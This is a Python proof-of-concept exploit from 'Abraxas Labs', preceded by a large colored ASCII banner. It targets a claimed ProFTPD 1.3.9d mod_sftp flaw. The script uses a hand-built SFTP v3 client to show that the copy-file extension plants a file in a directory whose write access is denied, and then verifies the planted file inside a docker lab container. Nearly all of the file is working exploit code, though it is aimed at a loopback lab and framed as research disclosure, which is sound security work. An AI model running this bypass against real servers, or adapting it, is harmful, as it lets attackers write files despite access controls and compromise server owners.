#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: proftpd-sftp-copy-file-write (High: 7.1)
#  Vendor: ProFTPD (proftpd.org)
#  Versions: ProFTPD 1.3.9d contrib mod_sftp
#  Impact: SFTP copy-file plants a new file under Limit WRITE DenyAll
#  Requires: SFTPEngine on; authenticated SFTP; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "proftpd-sftp-copy-file-write"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove ProFTPD 1.3.9d SFTP copy-file skips dest Limit WRITE for a new dest."""

import os
import socket
import struct
import subprocess
from dataclasses import dataclass
from pathlib import Path

import paramiko

LABEL = "PROFTPD-SFTP-COPY-FILE-WRITE"
WITNESS = "PROFTPD-SFTP-COPY-FILE-WRITE-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "proftpd-sftp-copy-file-write")
HERE = Path(__file__).resolve().parent
HOST = "127.0.0.1"
PORT = 18710
USERNAME = "labuser"
PASSWORD = "labpass"
SRC_PATH = "/readable/src.txt"
DEST_PATH = f"/nowrite/{WITNESS}"
DEST_HOST_PATH = f"/home/labuser/nowrite/{WITNESS}"
SERVICE = "sftp"
TIMEOUT_S = 20.0
SFTP_VERSION = 3
MAX_PACKET = 256 * 1024

FXP_INIT = 1
FXP_VERSION = 2
FXP_OPEN = 3
FXP_CLOSE = 4
FXP_READ = 5
FXP_STATUS = 101
FXP_HANDLE = 102
FXP_DATA = 103
FXP_EXTENDED = 200

SSH_FX_OK = 0
SSH_FX_EOF = 1
SSH_FX_PERMISSION_DENIED = 3

SSH_FXF_READ = 0x00000001
SSH_FXF_WRITE = 0x00000002
SSH_FXF_CREAT = 0x00000008
SSH_FXF_TRUNC = 0x00000010
SSH_FXF_EXCL = 0x00000020


@dataclass(frozen=True)
class FxpStatus:
    request_id: int
    code: int
    message: str


class SftpError(RuntimeError):
    """SFTP protocol or session failure."""


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 160) -> str:
    compact = text.replace("\r", "\\r").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def _pack_string(value: str | bytes) -> bytes:
    raw = value.encode("utf-8") if isinstance(value, str) else value
    return struct.pack(">I", len(raw)) + raw


def _unpack_string(payload: bytes, offset: int) -> tuple[bytes, int]:
    if offset + 4 > len(payload):
        raise SftpError("truncated-sftp-string-len")
    (length,) = struct.unpack_from(">I", payload, offset)
    start = offset + 4
    end = start + length
    if end > len(payload):
        raise SftpError("truncated-sftp-string")
    return payload[start:end], end


class RawSftp:
    """Minimal SFTP v3 client on a paramiko SSH channel."""

    def __init__(self, channel: paramiko.Channel) -> None:
        self._chan = channel
        self._req = 0
        self._chan.settimeout(TIMEOUT_S)

    def close(self) -> None:
        try:
            self._chan.close()
        except OSError:
            pass

    def _send(self, payload: bytes) -> None:
        self._chan.sendall(struct.pack(">I", len(payload)) + payload)

    def _recv_exact(self, size: int) -> bytes:
        buf = bytearray()
        while len(buf) < size:
            chunk = self._chan.recv(size - len(buf))
            if not chunk:
                raise SftpError("sftp-channel-eof")
            buf.extend(chunk)
        return bytes(buf)

    def _recv(self) -> bytes:
        (length,) = struct.unpack(">I", self._recv_exact(4))
        if length < 1 or length > MAX_PACKET:
            raise SftpError(f"bad-sftp-len:{length}")
        return self._recv_exact(length)

    def _next_id(self) -> int:
        self._req += 1
        return self._req

    def init(self) -> list[str]:
        self._send(bytes([FXP_INIT]) + struct.pack(">I", SFTP_VERSION))
        packet = self._recv()
        if packet[0] != FXP_VERSION:
            raise SftpError(f"expected-version-got:{packet[0]}")
        if len(packet) < 5:
            raise SftpError("short-version")
        (version,) = struct.unpack_from(">I", packet, 1)
        log(f"sftp-version server={version}")
        names: list[str] = []
        offset = 5
        while offset + 4 <= len(packet):
            name_b, offset = _unpack_string(packet, offset)
            if offset + 4 > len(packet):
                break
            _data, offset = _unpack_string(packet, offset)
            names.append(name_b.decode("utf-8", "replace"))
        if names:
            log("sftp-extensions " + ",".join(names))
        return names

    def _request(self, body: bytes) -> bytes:
        req_id = self._next_id()
        self._send(body[:1] + struct.pack(">I", req_id) + body[1:])
        packet = self._recv()
        if len(packet) < 5:
            raise SftpError("short-sftp-reply")
        (got_id,) = struct.unpack_from(">I", packet, 1)
        if got_id != req_id:
            raise SftpError(f"req-id-mismatch want={req_id} got={got_id}")
        return packet

    def status_or_handle(self, packet: bytes) -> tuple[FxpStatus | None, bytes | None]:
        kind = packet[0]
        if kind == FXP_STATUS:
            if len(packet) < 9:
                raise SftpError("short-status")
            (code,) = struct.unpack_from(">I", packet, 5)
            message_b, _off = _unpack_string(packet, 9) if len(packet) >= 13 else (b"", 9)
            (req_id,) = struct.unpack_from(">I", packet, 1)
            return (
                FxpStatus(req_id, code, message_b.decode("utf-8", "replace")),
                None,
            )
        if kind == FXP_HANDLE:
            handle, _off = _unpack_string(packet, 5)
            return None, handle
        raise SftpError(f"unexpected-fxp:{kind}")

    def open(self, path: str, pflags: int) -> tuple[FxpStatus | None, bytes | None]:
        body = (
            bytes([FXP_OPEN])
            + _pack_string(path)
            + struct.pack(">I", pflags)
            + struct.pack(">I", 0)
        )
        return self.status_or_handle(self._request(body))

    def close_handle(self, handle: bytes) -> FxpStatus:
        packet = self._request(bytes([FXP_CLOSE]) + _pack_string(handle))
        status, _handle = self.status_or_handle(packet)
        if status is None:
            raise SftpError("close-without-status")
        return status

    def read_all(self, handle: bytes, length: int = 4096) -> bytes:
        body = bytes([FXP_READ]) + _pack_string(handle) + struct.pack(">QI", 0, length)
        packet = self._request(body)
        if packet[0] == FXP_DATA:
            data, _off = _unpack_string(packet, 5)
            return data
        status, _handle = self.status_or_handle(packet)
        if status is None:
            raise SftpError("read-without-status")
        raise SftpError(f"read-status:{status.code}:{clip(status.message)}")

    def copy_file(self, src: str, dst: str, overwrite: bool) -> FxpStatus:
        body = (
            bytes([FXP_EXTENDED])
            + _pack_string("copy-file")
            + _pack_string(src)
            + _pack_string(dst)
            + bytes([1 if overwrite else 0])
        )
        packet = self._request(body)
        status, handle = self.status_or_handle(packet)
        if handle is not None:
            raise SftpError("copy-file-returned-handle")
        if status is None:
            raise SftpError("copy-file-without-status")
        return status


def _connect() -> tuple[paramiko.SSHClient, RawSftp]:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=HOST,
        port=PORT,
        username=USERNAME,
        password=PASSWORD,
        timeout=TIMEOUT_S,
        banner_timeout=TIMEOUT_S,
        auth_timeout=TIMEOUT_S,
        allow_agent=False,
        look_for_keys=False,
        compress=False,
    )
    transport = client.get_transport()
    if transport is None:
        client.close()
        raise SftpError("no-transport")
    chan = transport.open_session()
    chan.invoke_subsystem("sftp")
    sftp = RawSftp(chan)
    return client, sftp


def _read_container_dest() -> str:
    proc = compose("exec", "-T", SERVICE, "cat", DEST_HOST_PATH, timeout=30)
    if proc.returncode != 0:
        err = clip((proc.stderr or proc.stdout or "").strip() or "empty")
        raise SftpError(f"docker-cat-failed:{err}")
    return proc.stdout


def main() -> int:
    client: paramiko.SSHClient | None = None
    sftp: RawSftp | None = None
    try:
        client, sftp = _connect()
        extensions = sftp.init()
        if "copy-file" not in extensions:
            return fail("copy-file-not-advertised")

        src_status, src_handle = sftp.open(SRC_PATH, SSH_FXF_READ)
        if src_handle is None:
            code = src_status.code if src_status else -1
            return fail(f"src-open-denied:{code}")
        src_bytes = sftp.read_all(src_handle)
        sftp.close_handle(src_handle)
        src_text = src_bytes.decode("utf-8", "replace")
        log(f"src-read bytes={len(src_bytes)}")
        if WITNESS not in src_text:
            return fail("src-missing-witness")

        open_status, open_handle = sftp.open(
            DEST_PATH,
            SSH_FXF_WRITE | SSH_FXF_CREAT | SSH_FXF_EXCL,
        )
        if open_handle is not None:
            sftp.close_handle(open_handle)
            return fail("open-write-allowed")
        if open_status is None:
            return fail("open-write-no-status")
        log(f"open-write status={open_status.code} msg={clip(open_status.message)}")
        if open_status.code != SSH_FX_PERMISSION_DENIED:
            return fail(f"open-write-not-denied:{open_status.code}")

        copy_status = sftp.copy_file(SRC_PATH, DEST_PATH, overwrite=False)
        log(f"copy-file status={copy_status.code} msg={clip(copy_status.message)}")
        if copy_status.code != SSH_FX_OK:
            return fail(f"copy-file-denied:{copy_status.code}")

        dest_status, dest_handle = sftp.open(DEST_PATH, SSH_FXF_READ)
        if dest_handle is None:
            code = dest_status.code if dest_status else -1
            return fail(f"dest-open-read-denied:{code}")
        dest_bytes = sftp.read_all(dest_handle)
        sftp.close_handle(dest_handle)
        dest_text = dest_bytes.decode("utf-8", "replace")
        log(f"dest-read bytes={len(dest_bytes)}")
        if WITNESS not in dest_text:
            return fail("dest-missing-witness")

        host_text = _read_container_dest()
        if WITNESS not in host_text:
            return fail("container-dest-missing-witness")
        log("container-dest-exists yes")

        overwrite_status = sftp.copy_file(SRC_PATH, DEST_PATH, overwrite=True)
        log(
            "copy-file-overwrite "
            f"status={overwrite_status.code} msg={clip(overwrite_status.message)}"
        )
        overwrite_denied = overwrite_status.code == SSH_FX_PERMISSION_DENIED

        log(
            f"SUCCESS {LABEL} dest-exists=yes open-write=denied copy-file=ok "
            f"overwrite-denied={'yes' if overwrite_denied else 'no'} {WITNESS}"
        )
        return 0
    except (OSError, socket.timeout, paramiko.SSHException, SftpError) as exc:
        logs = compose("logs", "--no-color", "--tail=80", SERVICE, timeout=30)
        if logs.stdout:
            log("compose-logs " + clip(logs.stdout, 800))
        return fail(f"{type(exc).__name__}:{clip(str(exc))}")
    finally:
        if sftp is not None:
            sftp.close()
        if client is not None:
            client.close()


if __name__ == "__main__":
    raise SystemExit(main())

